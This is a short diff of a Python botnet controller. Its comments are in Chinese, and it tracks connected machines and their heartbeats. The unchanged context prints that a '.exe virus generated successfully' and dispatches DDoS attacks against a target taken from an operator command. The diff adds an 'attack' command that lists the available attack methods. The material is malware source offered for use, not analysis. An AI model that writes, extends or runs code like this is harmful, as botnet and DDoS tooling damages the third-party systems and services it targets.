@@ -5,6 +5,7 @@ from os import system, remove, mkdir, _exit
 from os import path as os_path
 from shutil import rmtree, copy
 from random import randint
+
 buffsize = 512 #数据包大小
 datasock_list = {}  # 机器字典  {No:socket}
 last_Heartbeat = {}  # 记录机器的上次心跳时间
@@ -129,6 +130,8 @@ def post_cmd():
             rmtree("dist")
             print_good(f"{name}.exe virus generated successfully")
             
+        elif command == 'attack':
+            print_normal(f"Available attack method {mode_list}")
         elif command.split('_')[0] == 'attack':
             # ddos攻击
             target = command.split('_')[2]
